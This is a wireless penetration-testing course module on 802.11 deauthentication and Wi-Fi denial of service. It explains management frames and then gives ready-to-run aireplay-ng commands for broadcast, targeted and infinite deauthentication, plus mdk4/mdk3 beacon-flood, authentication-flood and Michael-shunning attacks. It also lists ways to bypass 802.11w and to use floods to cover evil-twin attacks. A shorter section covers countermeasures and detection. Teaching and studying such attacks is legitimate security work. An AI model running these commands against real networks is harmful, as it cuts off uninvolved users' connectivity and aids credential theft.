# Module 08 — Deauthentication & Wireless DoS

> **Prerequisites:** [Module 07 — WPA2 Cracking](../module-07-wpa2-cracking/)
> **Next Module:** [Module 09 — Evil Twin Access Points](../module-09-evil-twin/)

---

## Table of Contents

1. [Understanding Deauthentication Frames](#1-understanding-deauthentication-frames)
2. [Why Deauth Attacks Work](#2-why-deauth-attacks-work)
3. [Performing Deauthentication Attacks](#3-performing-deauthentication-attacks)
4. [Broadcast vs. Targeted Deauth](#4-broadcast-vs-targeted-deauth)
5. [Using mdk3 and mdk4 for DoS](#5-using-mdk3-and-mdk4-for-dos)
6. [Beacon Flooding Attacks](#6-beacon-flooding-attacks)
7. [802.11w and Management Frame Protection](#7-80211w-and-management-frame-protection)
8. [Countermeasures and Detection](#8-countermeasures-and-detection)
9. [Knowledge Check](#9-knowledge-check)

---

## 1. Understanding Deauthentication Frames

### What Are Deauthentication Frames?

Deauthentication frames are **management frames** that tell a client to disconnect from an AP. They are part of the normal 802.11 protocol and are used when:

- A client voluntarily disconnects
- An AP needs to terminate a session
- Network maintenance requires reassociation

### Frame Structure

```
802.11 Management Frame
├── Frame Control (0x00C0)
├── Duration
├── Destination MAC (client)
├── Source MAC (AP)
├── BSSID
├── Sequence Control
└── Reason Code (1-51)
```

### Common Reason Codes

| Code | Meaning |
|------|---------|
| 1 | Unspecified reason |
| 3 | Station leaving BSS |
| 6 | Class 2 frame from nonauthenticated station |
| 7 | Class 3 frame from nonassociated station |
| 8 | Station leaving IBSS or ESS |
| 12 | Association not authenticated |

---

## 2. Why Deauth Attacks Work

### The Vulnerability

The 802.11 standard originally had **no authentication** for management frames like deauthentication. This means:

1. Anyone can send a deauth frame claiming to be the AP
2. Clients will obey and disconnect
3. No cryptographic verification required

### Attack Uses

- **Handshake capture** — Force clients to reconnect to capture new handshakes (Module 06)
- **Denial of Service** — Keep clients disconnected
- **Evil Twin setup** — Disconnect clients from legitimate AP before luring them to rogue AP
- **Network disruption** — Simple way to disrupt wireless connectivity

---

## 3. Performing Deauthentication Attacks

### Using aireplay-ng

```bash
# Broadcast deauth - disconnects all clients
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Send 10 deauth frames (recommended to avoid network issues)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### Targeted Deauth (Specific Client)

```bash
# Deauth specific client
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# -a = BSSID (AP MAC)
# -c = Client MAC to target
```

### Continuous Attack

```bash
# Infinite deauth (until Ctrl+C)
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

---

## 4. Broadcast vs. Targeted Deauth

### Broadcast Deauth

```bash
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon
```

**Effect:** Disconnects ALL clients from the AP
**Use case:** General disruption, handshake capture when any client will do

### Targeted Deauth

```bash
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```

**Effect:** Disconnects ONLY the specified client
**Use case:** 
- More precise attacks
- Avoid affecting other clients
- Target specific users

### Effectiveness Comparison

| Type | Stealth | Impact | Use Case |
|------|---------|--------|----------|
| Broadcast | Low | High | Quick handshake capture |
| Targeted | Higher | Lower | Precision attacks |

---

## 5. Using mdk3 and mdk4 for DoS

### md3/mdk4 Overview

mdk3 and mdk4 are specialized wireless attack tools that can perform various DoS attacks beyond simple deauth.

### Installation

```bash
sudo apt install mdk4
```

### mdk4 Attack Modes

```bash
# Beacon flooding - flood with fake APs
sudo mdk4 wlan0mon b

# Deauthentication attack
sudo mdk4 wlan0mon d -B AA:BB:CC:DD:EE:FF

# Authentication flood
sudo mdk4 wlan0mon a -B AA:BB:CC:DD:EE:FF

# Michael shunning (TKIP DoS)
sudo mdk4 wlan0mon m -B AA:BB:CC:DD:EE:FF -t 1A:2B:3C:4D:5E:6F
```

### mdk3 Legacy Commands

```bash
# Beacon flood mode
sudo mdk3 wlan0mon b -n MyNetwork -w -m

# Deauth amok mode
sudo mdk3 wlan0mon d
```

---

## 6. Beacon Flooding Attacks

### What Is Beacon Flooding?

Beacon flooding floods the area with fake access point beacon frames, overwhelming client scanning and making it difficult to find legitimate networks.

### Using mdk4

```bash
# Basic beacon flood
sudo mdk4 wlan0mon b

# With custom SSIDs from wordlist
sudo mdk4 wlan0mon b -f /path/to/ssid.txt

# Random SSIDs
sudo mdk4 wlan0mon b -v
```

### Countering Beacon Floods

- Clients may struggle to connect to real APs
- Some devices may freeze or crash
- Useful for covering an Evil Twin attack

---

## 7. 802.11w and Management Frame Protection

### What Is 802.11w?

802.11w (2009) added **Management Frame Protection (MFP)** to encrypt management frames including deauthentication and disassociation frames.

### Protection Levels

| Level | Protection | Effect |
|-------|-----------|--------|
| **Disabled** | None | Vulnerable to all deauth attacks |
| **Optional** | Some frames | Clients may still be vulnerable |
| **Mandatory** | All frames | Deauth attacks blocked (mostly) |

### Detection

```bash
# Check if AP supports 802.11w in airodump
# Look for "MFP" in the authentication column
airodump-ng wlan0mon
```

### Bypassing 802.11w

- Attack encrypted management frames directly (requires handshake)
- Use PMKID attacks (Module 12)
- Some implementations still vulnerable to specific attacks
- Client-side vulnerabilities still exist

---

## 8. Countermeasures and Detection

### Network-Side Countermeasures

1. **Enable 802.11w (MFP)**
   - Configure AP to require MFP
   - Most modern APs support this

2. **Enable Rogue AP Detection**
   - Enterprise APs often include this
   - Alerts when deauth spikes detected

3. **Use WPA3**
   - SAE authentication is resistant to deauth

4. **Client Isolation**
   - Prevents client-to-client attacks

### Detection Methods

```bash
# Monitor for unusual deauth patterns
sudo tcpdump -i wlan0mon subtype deauthentication

# Wireshark filter
wlan.fc.subtype == 12
```

### Client-Side Protection

- Use 802.11w-compatible devices
- Keep firmware updated
- Use VPN (doesn't prevent disconnect but protects traffic)

---

## 9. Knowledge Check

Before proceeding to Module 09, you should be able to:

1. What type of 802.11 frame is a deauthentication frame, and why was it historically vulnerable?
2. Write the command to send a broadcast deauth attack to an AP with BSSID AA:BB:CC:DD:EE:FF.
3. What is the difference between broadcast and targeted deauthentication in terms of effect and use case?
4. What is beacon flooding and what tool is commonly used for it?
5. What is 802.11w (Management Frame Protection) and how does it affect deauth attacks?
6. What are some countermeasures that network administrators can implement to reduce the effectiveness of deauth attacks?
7. Explain how deauthentication attacks are commonly used as part of a handshake capture workflow.
8. What is the "Michael shunning" attack associated with mdk4, and what encryption is it targeted against?
9. How would you detect deauthentication frames being sent on a network using Wireshark?
10. Why might a penetration tester use a targeted deauth rather than a broadcast deauth?

---

**Next:** [Module 09 — Evil Twin Access Points](../module-09-evil-twin/)
